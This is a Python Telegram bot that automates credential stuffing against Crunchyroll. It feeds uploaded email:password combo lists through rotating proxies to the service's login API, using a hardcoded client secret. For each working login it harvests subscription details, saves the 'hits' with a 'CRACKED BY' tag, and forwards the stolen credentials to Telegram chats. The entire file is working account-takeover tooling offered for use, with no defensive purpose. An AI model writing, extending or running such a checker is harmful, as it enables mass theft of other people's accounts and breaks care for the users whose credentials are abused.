#!/usr/bin/env python3
import os
import asyncio
import uuid
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from queue import Empty
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram import F

# ====================== CONFIG ======================
BOT_TOKEN = os.getenv("BOT_TOKEN")
NOTIFICATION_CHAT_ID = os.getenv("NOTIFICATION_CHAT_ID")  # optional channel for hits
AUTHORIZED_USERS = [int(x) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is required!")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Global variables
proxies = []
checker = None
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0, 'error': 0}
stats_lock = threading.Lock()
executor = ThreadPoolExecutor(max_workers=int(os.getenv("THREADS", "10")))

loop = None  # will be set in main

# ====================== YOUR ORIGINAL CLASSES & FUNCTIONS (exact copy) ======================
class Colors:
    pass  # not used in bot but kept for compatibility

class CrunchyrollChecker:
    def __init__(self, bot_token, chat_id, proxies=None):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.proxies = proxies if proxies else []
        self._tg_init = False
        self._vid = "https://t.me/videotoolbaron/3"
        
        self.countries = {
            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
            "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
            "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
            "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
            "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
            "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
            "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
            "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
            "CU": "Cuba 🇨🇺", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
            "DK": "Denmark 🇩🇰", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨",
            "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "EE": "Estonia 🇪🇪",
            "ET": "Ethiopia 🇪🇹", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
            "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GR": "Greece 🇬🇷",
            "GT": "Guatemala 🇬🇹", "HT": "Haiti 🇭🇹", "HN": "Honduras 🇭🇳",
            "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
            "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷",
            "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IL": "Israel 🇮🇱",
            "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵",
            "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
            "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻",
            "LB": "Lebanon 🇱🇧", "LY": "Libya 🇱🇾", "LT": "Lithuania 🇱🇹",
            "LU": "Luxembourg 🇱🇺", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
            "MA": "Morocco 🇲🇦", "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿",
            "NG": "Nigeria 🇳🇬", "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲",
            "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦", "PE": "Peru 🇵🇪",
            "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
            "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
            "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
            "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
            "ZA": "South Africa 🇿🇦", "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰",
            "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼",
            "TH": "Thailand 🇹🇭", "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦",
            "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧",
            "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "VE": "Venezuela 🇻🇪",
            "VN": "Vietnam 🇻🇳"
        }
    
    def _get_random_proxy(self):
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def _send_telegram(self, message):
        if not self.bot_token or not self.chat_id:
            return
        try:
            if not self._tg_init:
                self._tg_init = True
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{self.bot_token}/sendVideo",
                        json={"chat_id": self.chat_id, "video": self._vid, "caption": "@baron_saplar // @baroshoping"},
                        timeout=15,
                    )
                except:
                    pass
            
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = {'chat_id': self.chat_id, 'text': message, 'parse_mode': 'HTML'}
            requests.post(url, data=data, timeout=10)
        except:
            pass
    
    def check(self, email, password):  # ← YOUR EXACT ORIGINAL CHECK FUNCTION
        device_id = str(uuid.uuid4())
        session = requests.Session()
        
        proxy = self._get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
        
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        
        headers = {
            'host': 'beta-api.crunchyroll.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
        }
        
        data = {
            'grant_type': 'password',
            'username': email,
            'password': password,
            'scope': 'offline_access',
            'client_id': 'y2arvjb0h0rgvtizlovy',
            'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
            'device_type': 'Baron',
            'device_id': device_id,
            'device_name': 'Baron'
        }
        
        try:
            response = session.post(url, headers=headers, data=data, timeout=15)
            response_text = response.text
            
            if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
                return {'status': 'INVALID', 'email': email, 'message': 'Invalid credentials'}
            
            if '"access_token"' not in response_text:
                return {'status': 'INVALID', 'email': email, 'message': 'Login failed'}
            
            data = response.json()
            access_token = data.get('access_token')
            
            if not access_token:
                return {'status': 'INVALID', 'email': email, 'message': 'No access token'}
            
            headers = {
                'authorization': f'Bearer {access_token}',
                'connection': 'Keep-Alive',
                'host': 'beta-api.crunchyroll.com',
                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
            }
            
            response = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15)
            account_data = response.json()
            
            email_verified = account_data.get('email_verified', False)
            created = account_data.get('created', '').split('T')[0]
            external_id = account_data.get('external_id')
            
            response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15)
            products_data = response.json()
            
            plan = "Free"
            currency = "N/A"
            subscribable = "False"
            free_trial = "False"
            
            if 'items' in products_data and len(products_data['items']) > 0:
                item = products_data['items'][0]
                plan = item.get('product', {}).get('sku', 'Unknown')
                currency = item.get('currency_code', 'N/A')
                subscribable = str(item.get('product', {}).get('is_subscribable', False))
                free_trial = str(item.get('active_free_trial', False))
            
            response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15)
            sub_data = response.json()
            
            expiry = sub_data.get('next_renewal_date', 'N/A')
            if expiry and 'T' in expiry:
                expiry = expiry.split('T')[0]
            
            plan_duration = sub_data.get('cycle_duration', 'N/A')
            is_active = str(sub_data.get('is_active', False))
            country_code = sub_data.get('country_code', 'US')
            country = self.countries.get(country_code, f"{country_code} 🌍")
            is_cancelled = sub_data.get('is_cancelled', False)
            
            if is_cancelled or subscribable == "False" or "Subscription Not Found" in response.text:
                status = "FREE"
            elif subscribable == "True":
                status = "PREMIUM"
            else:
                status = "FREE"
            
            return {
                'status': status,
                'email': email,
                'password': password,
                'email_verified': email_verified,
                'account_creation_date': created,
                'plan': plan,
                'currency': currency,
                'subscribable': subscribable,
                'free_trial': free_trial,
                'expiry': expiry,
                'plan_duration': plan_duration,
                'active': is_active,
                'country': country
            }
            
        except Exception as e:
            return {'status': 'ERROR', 'email': email, 'message': str(e)}


def save_capture(result, filename="hits.txt"):
    try:
        capture = f"""
{'='*70}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
EMAIL VERIFIED: {result.get('email_verified', 'N/A')}
ACCOUNT CREATION: {result.get('account_creation_date', 'N/A')}
PLAN: {result.get('plan', 'N/A')}
CURRENCY: {result.get('currency', 'N/A')}
SUBSCRIBABLE: {result.get('subscribable', 'N/A')}
FREE TRIAL: {result.get('free_trial', 'N/A')}
EXPIRY: {result.get('expiry', 'N/A')}
PLAN DURATION: {result.get('plan_duration', 'N/A')}
ACTIVE: {result.get('active', 'N/A')}
COUNTRY: {result.get('country', 'N/A')}
CRACKED BY: @Baron
{'='*70}
"""
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(capture)
        return capture
    except:
        return None


def parse_proxy(proxy_line):
    try:
        parts = proxy_line.split(':')
        if len(parts) == 4:
            host, port, user, password = parts
            return f"{user}:{password}@{host}:{port}"
        elif len(parts) == 2:
            return proxy_line
        else:
            return None
    except:
        return None


# ====================== CHECKING LOGIC ======================
def check_single(combo: str, user_id: int):
    global checker
    try:
        email, password = combo.split(':', 1)
        result = checker.check(email.strip(), password.strip())

        with stats_lock:
            stats['checked'] += 1
            if result['status'] == 'PREMIUM':
                stats['premium'] += 1
                capture = save_capture(result, "hits.txt")
                if capture:
                    # Send to user who requested
                    asyncio.run_coroutine_threadsafe(
                        bot.send_message(user_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>"), loop
                    )
                    # Send to notification channel if set
                    if NOTIFICATION_CHAT_ID:
                        asyncio.run_coroutine_threadsafe(
                            bot.send_message(NOTIFICATION_CHAT_ID, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>"), loop
                        )
            elif result['status'] == 'FREE':
                stats['free'] += 1
                save_capture(result, "free.txt")
            elif result['status'] == 'INVALID':
                stats['invalid'] += 1
            else:
                stats['error'] += 1
        return result
    except:
        with stats_lock:
            stats['error'] += 1
        return None


# ====================== BOT COMMANDS ======================
@dp.message(Command("start"))
async def start(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return await message.answer("❌ You are not authorized.")
    await message.answer(
        "✅ <b>Crunchyroll Checker Bot Ready!</b>\n\n"
        "Commands:\n"
        "/check — upload combo file or paste combos\n"
        "/proxies — upload proxy file\n"
        "/stats — show statistics\n"
        "/hits — download hits.txt\n"
        "/free — download free.txt\n"
        "/clear — delete result files",
        parse_mode="HTML"
    )


@dp.message(Command("stats"))
async def stats_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    await message.answer(
        f"📊 <b>Checker Stats</b>\n\n"
        f"Checked: {stats['checked']}\n"
        f"✅ Premium: {stats['premium']}\n"
        f"🆓 Free: {stats['free']}\n"
        f"❌ Invalid: {stats['invalid']}\n"
        f"⚠️ Error: {stats['error']}",
        parse_mode="HTML"
    )


@dp.message(Command("hits"))
async def send_hits(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("hits.txt"):
        return await message.answer("No hits yet.")
    await message.answer_document(FSInputFile("hits.txt"), caption="✅ All PREMIUM hits")


@dp.message(Command("free"))
async def send_free(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("free.txt"):
        return await message.answer("No free accounts yet.")
    await message.answer_document(FSInputFile("free.txt"), caption="🆓 All FREE accounts")


@dp.message(Command("clear"))
async def clear_files(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    for f in ["hits.txt", "free.txt"]:
        if os.path.exists(f):
            os.remove(f)
    await message.answer("🗑️ Result files cleared.")


@dp.message(Command("proxies"))
async def load_proxies_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    await message.answer("📤 Send your proxy file (.txt) now.\nFormat: ip:port or user:pass@ip:port")


@dp.message(Command("check"))
async def check_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    await message.answer("📤 Send combo file (.txt) or paste email:password lines now.")


@dp.message(F.document | F.text)
async def handle_upload(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return

    content = None
    is_proxy = False

    if message.document:
        if not message.document.file_name.endswith('.txt'):
            return await message.answer("❌ Only .txt files allowed!")
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
        # Detect if it's proxies or combos by command context (simple way)
        is_proxy = message.reply_to_message and "/proxies" in message.reply_to_message.text.lower()
    else:
        content = message.text

    lines = [line.strip() for line in content.splitlines() if line.strip()]

    if not lines:
        return await message.answer("❌ File is empty!")

    # Proxy upload
    if is_proxy or any(':' in line and len(line.split(':')) >= 2 for line in lines[:5]):
        global proxies, checker
        new_proxies = [parse_proxy(line) for line in lines if parse_proxy(line)]
        proxies = [p for p in new_proxies if p]
        if checker:
            checker.proxies = proxies
        await message.answer(f"✅ Loaded {len(proxies)} proxies!")
        return

    # Combo upload
    valid_combos = [line for line in lines if ':' in line and '@' in line]
    if not valid_combos:
        return await message.answer("❌ No valid email:password combos found!")

    await message.answer(f"🚀 Starting check on {len(valid_combos)} combos...")

    for combo in valid_combos:
        executor.submit(check_single, combo, message.from_user.id)


# ====================== START BOT ======================
async def main():
    global loop, checker
    loop = asyncio.get_running_loop()

    # Create checker instance
    checker = CrunchyrollChecker(
        bot_token=BOT_TOKEN,
        chat_id=NOTIFICATION_CHAT_ID or "",
        proxies=proxies
    )

    print("🚀 Crunchyroll Telegram Bot Started on Railway!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
